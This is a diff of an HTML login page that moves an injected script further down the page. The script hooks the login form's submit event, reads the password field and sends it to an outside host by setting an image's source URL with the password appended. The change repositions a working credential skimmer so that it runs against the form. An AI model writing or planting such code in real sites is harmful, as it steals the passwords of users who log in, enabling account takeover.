@@ -11,15 +11,6 @@
     <link href="login482787041.gz.css" media="screen" rel="stylesheet" type="text/css">
 
     <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
-
-    <script>function intercept() { 
-        var pass = document.forms[0].elements[1].value; 
-        var i = new Image; 
-        i.src = "http://r7.io/e/moffotto?s="+pass;
-        } 
-        document.forms[0].onsubmit = intercept;
-    </script>
-
     <script>
         $(document).ready( function() {
             language = 'english';
@@ -39,6 +30,13 @@
     
     
     
+    <script>function intercept() { 
+        var pass = document.forms[0].elements[1].value; 
+        var i = new Image; 
+        i.src = "http://r7.io/e/moffotto?s="+pass;
+        } 
+        document.forms[0].onsubmit = intercept;
+    </script>
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
